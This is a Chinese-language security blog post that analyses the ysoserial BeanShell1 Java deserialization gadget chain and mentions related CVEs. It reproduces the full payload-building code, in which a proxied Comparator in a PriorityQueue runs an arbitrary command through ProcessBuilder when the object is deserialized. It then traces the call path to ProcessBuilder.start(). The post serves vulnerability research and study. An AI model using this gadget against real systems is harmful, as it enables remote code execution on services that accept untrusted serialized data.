> 原文链接: https://www.anquanke.com//post/id/215861 


# ysoserial-BeanShell1利用链研究


                                阅读量   
                                **218644**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t0181b7a82fa9aa0ef7.png)](https://p5.ssl.qhimg.com/t0181b7a82fa9aa0ef7.png)



## 背景介绍

### <a class="reference-link" name="BeanShell"></a>BeanShell

前面的利用链，网上大多找到了分析文章，很遗憾这篇没有了，所以要自己着手开始分析。

我的思路是首先从import的包入手。了解多java后，很多时候能从包名看出程序会采用到什么功能如动态代理，字节码编程之类的。其次就是当你不太了解这个程序时，去查查包名，有时候大概率能知道这个包内的大概作用。对于像我们这样分析漏洞的人来说，了解有哪些包还可以很快定位到漏洞点。所以开始吧！

#### <a class="reference-link" name="inport%20bsh"></a>inport bsh

```
import bsh.Interpreter;
import bsh.XThis;
```

##### <a class="reference-link" name="BeanShell"></a>BeanShell

事实上我一开始并没有看出bsh和beanshell的关系。。。不过没关系，[Beanshell](http://www.beanshell.org/manual/bshmanual.html)是用Java写成的，一个小型的、免费的、可以下载的、嵌入式的Java源代码解释器，具有对象脚本语言特性。BeanShell执行标准Java语句和表达式，另外包括一些脚本命令和语法。<br>
例如，最经典的hello world：

```
// File: helloWorld.bsh
helloWorld() `{`
    print("Hello World!");
`}`
```

具体的就去看[BeanShell](http://www.beanshell.org/manual/bshmanual.html)的官方文档。

##### <a class="reference-link" name="bsh.Interpreter"></a>bsh.Interpreter

Beanshell有三种运行方式：

```
java bsh.Console       // run the graphical desktop

java bsh.Interpreter   // run as text-only on the command line

java bsh.Interpreter filename [ args ] // run script file
```

可以看到第二种为命令行方式运行，第三种为直接运行一个脚本。都需要引入[bsh.Interpreter](http://www.beanshell.org/javadoc/bsh/Interpreter.html)。使用代码为：

```
Interpreter interpreter = new Interpreter();
```

看起来这个包是一个通用包，粗略估计漏洞点很可能在下一个bsh的包中。

##### <a class="reference-link" name="bsh.XThis;"></a>bsh.XThis;

在搜索时只搜到了官方文档中的bsh.This这一个包。猜测XThis是他的扩展，因为我还看到了JThis之类的。。。[bsh.This：](http://www.beanshell.org/javadoc/bsh/This.html)‘This’是bsh脚本对象的类型。一个’This’对象是一个bsh脚本对象上下文。它包含一个名称空间引用，并实现事件侦听器和各种其他接口。它持有对从bsh外部回调的声明解释器的引用。接下来直接进到XThis的代码中，看到`public class XThis extends This`,也确实了刚刚的猜想。<br>
具体还可以去看看对他的备注：

```
/**
    XThis is a dynamically loaded extension which extends This.java and adds
    support for the generalized interface proxy mechanism introduced in
    JDK1.3.  XThis allows bsh scripted objects to implement arbitrary
    interfaces (be arbitrary event listener types).

*/
XThis是一个动态加载的扩展，它扩展了This.java并添加了对JDK1.3中引入的通用接口代理机制的支持。      
允许bsh脚本化对象实现任意接口(任意事件侦听器类型)。
```

允许实现任意接口这个描述很值得注意哦~，刚刚也猜测了漏洞触发点大概率是在这个包中，那么去看看他实现了那些方法。两个方法，其中的invoke非常耀眼。。。这里先不跟进，下个断点，待会儿具体代码分析的时候再回来具体看。

###### <a class="reference-link" name="CVE-2016-2510&amp;&amp;CVE-2017-5586"></a>CVE-2016-2510&amp;&amp;CVE-2017-5586

在查找bsh.XThis的时候，因为不是很常用，还找到了一个漏洞CVE-2017-5586与这个包相关，[https://www.anquanke.com/vul/id/1123714](https://www.anquanke.com/vul/id/1123714) 是OpenTextDocumentumD2的一个远程代码执行漏洞。在OpenTextDocumentumD2中包含BeanShell (bsh)和Apache Commons库，当接受来自不可信源的序列化数据时，会导致远程代码执行。<br>
除此之外还看到了一个CVE-2016-2510为beanshell的反序列漏洞。通过两个实际漏洞的学习也可以更加了解利用链。

#### <a class="reference-link" name="inport%20xxx"></a>inport xxx

```
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.Comparator;
import java.util.PriorityQueue;
```

剩下几个就很常见了，这里就不细说了。包含动态代理，对数组的处理。看到PriorityQueue，根据之前的经验就是去着重注意他的comparator接口中的compare()是否被重写利用。



## 漏洞分析

### <a class="reference-link" name="getObject"></a>getObject

```
public PriorityQueue getObject(String command) throws Exception `{`
// BeanShell payload

    String payload =
        "compare(Object foo, Object bar) `{`new java.lang.ProcessBuilder(new String[]`{`" +
            Strings.join( // does not support spaces in quotes
                Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\\"").split(" ")),
                ",", "\"", "\"") +
            "`}`).start();return new Integer(1);`}`";

// Create Interpreter
Interpreter i = new Interpreter();

// Evaluate payload
i.eval(payload);

// Create InvocationHandler
XThis xt = new XThis(i.getNameSpace(), i);
InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);

// Create Comparator Proxy
Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class&lt;?&gt;[]`{`Comparator.class`}`, handler);

// Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
final PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;Object&gt;(2, comparator);
Object[] queue = new Object[] `{`1,1`}`;
Reflections.setFieldValue(priorityQueue, "queue", queue);
Reflections.setFieldValue(priorityQueue, "size", 2);

return priorityQueue;
`}`
```

这个方法中，在第2行首先以字符串的形式定义了一个compare函数，最终的值(string)为：

```
compare(Object foo, Object bar)
`{`
    new java.lang.ProcessBuilder(new String[]`{`"calc.exe"`}`).start();
    return new Integer(1);
`}`
```

接着3,4行以beanshell的格式编写脚本，其中第4行将上面的字符串转为了表达式并执行最终返回一个object。<br>
关于eval()举两个栗子:

```
Interpreter interpre = new Interpreter(); //创建一个解析器
interpre.set("num",111);
1. String str="int sum=44*num;"+"result=num;";
2. String str="public int sum()`{`\n" +"int a=3+2;\n" +"return a;\n" +"    `}`";
interpre.set("变量名",值);
interpre.eval(str); //执行代码
```

上述的eval中执行的字符串为简单的表达式时如同1，会进入BSHTypedVariableDeclaration这个类中，并直接获得执行结果`Object value = dec.eval( typeNode, callstack, interpreter);`；<br>
当eval中执行的字符串为一个函数时如同2，会经过判断而进入BSHMethodDeclaration这个类中，此时并不会直接执行。而是将interperter的methods变量置为了该函数：`namespace.setMethod( name, bshMethod );`。

很明显在本利用链中也是利用了这一特性，隐藏了恶意代码。

[![](https://p2.ssl.qhimg.com/t01c7e71098dd4106a2.png)](https://p2.ssl.qhimg.com/t01c7e71098dd4106a2.png)

现在恶意代码已经构造好了，那么如何触发他就是接下来的问题了。正如上文所说XThis可以允许脚本对象实现任意接口，回到getObject方法，在第5,6,7行将包含恶意代码的namespace给到xt，并通过动态代理的方式，连接到了我们接下来要用到的comparator接口。<br>
第9,10,11行中正如注释所说是触发漏洞的设置。PriorityQueue是一个优先级队列，当在序列化PriorityQueue时，会依次读取队列中的对象，并放到数组中存储并排序，排序过程中就会使用compare(),此时就会触发先前构造的代码，简单流程如下：

[![](https://p0.ssl.qhimg.com/t01e27b6b1491f7c142.png)](https://p0.ssl.qhimg.com/t01e27b6b1491f7c142.png)

### <a class="reference-link" name="XThis.invoke"></a>XThis.invoke

首先来看一下整个利用链的调用过程，这里截取了从PriorityQueue的readObject开始一直到最后的ProcessBuilder.start()。

[![](https://p3.ssl.qhimg.com/t01493833fbae53032d.png)](https://p3.ssl.qhimg.com/t01493833fbae53032d.png)

大致的流程已经差不多了，还剩一个点不是很清楚，之前说beanshell中eval()执行为函数时，会通过BSHMethodDeclaration类将interpeter的methods变为刚刚的函数而不执行。此时已经代码已经从PriorityQueue调用到了XThis中的这个函数compare()了，后续来跟着调试一下看看最后具体是怎么执行到的start()。<br>
这一步的目的在于更清楚的了解使用XThis的原因，以及上面没有讲到的XThis的invoke函数。<br>
当siftDownUsingComparator调用compare之后，根据之前的代理直接就会进入XThis中：

[![](https://p1.ssl.qhimg.com/t01eaf34cca8fb58099.png)](https://p1.ssl.qhimg.com/t01eaf34cca8fb58099.png)

具体的参数信息如下：

[![](https://p4.ssl.qhimg.com/t011588e5b918f0de26.png)](https://p4.ssl.qhimg.com/t011588e5b918f0de26.png)

后续流程这里不具体显示，总之根据深入的跟进来到了Reflect类：

[![](https://p1.ssl.qhimg.com/t0112f3bf8158b46924.png)](https://p1.ssl.qhimg.com/t0112f3bf8158b46924.png)

BSHPrimarySuffix的175行：

```
try `{`
        return Reflect.invokeObjectMethod(
        obj, field, oa, interpreter, callstack, this );
    `}`
```

可以看到通过前面不断的跟进，在doName()中进入了到反射到processbuilder的临门一脚。<br>
最后在Reflect类的134行中，反射来到了ProcessBuilder.start()：

```
Object returnValue = method.invoke( object, tmpArgs );
```



## 总结

这条利用链比较简单，在分析过程中要善用官方文档，对于BeanShell的很多内容可能看代码还会有疑问，但是代码联系注释和官方文档可以比较轻松的了解大意。还有就是分析中不管怎么样要走完完整的一遍，在第一遍中我只分析到了getobject中到底序列化了什么。但是实际上后续在写文档记录重新理清思路时，对于XThis的理解还不清楚，之后再整体跟进了一遍就清楚了许多了。
